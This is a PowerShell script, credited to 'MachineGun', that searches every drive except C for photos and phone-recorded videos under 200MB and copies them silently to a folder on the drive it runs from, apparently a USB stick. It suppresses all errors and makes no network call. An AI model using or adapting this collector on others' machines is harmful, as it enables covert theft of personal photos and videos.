#CODED By MachineGun 
#Tuesday, Dec 10, 2024 12:58:28 PM
#This Script Designed To copy The Images Of the System To the flash 
<#
                  _________-----_____
       _____------           __      ----_
___----             ___------              \
   ----________        ----                 \
               -----__    |             _____)
                    __-                /     \
        _______-----    ___--          \    /)\
  ------_______      ---____            \__/  /
               -----__    \ --    _          /\
                      --__--__     \_____/   \_/\
                              ----|   /          |
                                  |  |___________|
                                  |  | ((_(_)| )_)
                                  |  \_((_(_)|/(_)
                                  \             (
                                   \_____________)
#>
#########################

$pwdlocation = (Get-Location).Path 

# Define destination folders for images and videos
$imageslocation = Join-Path -Path $pwdlocation -ChildPath "pardisuni\images"
$videoslocation = Join-Path -Path $pwdlocation -ChildPath "pardisuni\videos"

# Ensure the destination folders exist
foreach ($location in @($imageslocation, $videoslocation)) {
    if (!(Test-Path -Path $location)) {
        New-Item -ItemType Directory -Path $location | Out-Null
    }
}

# Define possible drives
$drives = "A", "B", "D","E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"
$available_drives = @()

# Check which drives are available
foreach ($drive in $drives) {
    $drivePath = $drive + ":\"
    if (Test-Path -Path $drivePath) {
        $available_drives += $drivePath
    }
}

# Process each available drive
foreach ($drivePath in $available_drives) {
    try {
        # Process Images
        $images = Get-ChildItem -Path $drivePath -Recurse -Include *.jpg, *.jpeg, *.HEIC -File -ErrorAction SilentlyContinue
        foreach ($image in $images) {
            try {
                $destinationPath = Join-Path -Path $imageslocation -ChildPath $image.Name
                Copy-Item -Path $image.FullName -Destination $destinationPath -ErrorAction Stop
            } catch { }
        }

        # Process Videos under 200MB (recorded by Android or iPhone)
        $videos = Get-ChildItem -Path $drivePath -Recurse -Include *.mp4, *.mov -File -ErrorAction SilentlyContinue |
                  Where-Object { $_.Length -lt 200MB }
        foreach ($video in $videos) {
            try {
                $destinationPath = Join-Path -Path $videoslocation -ChildPath $video.Name
                Copy-Item -Path $video.FullName -Destination $destinationPath -ErrorAction Stop
            } catch { }
        }
    } catch { }
}
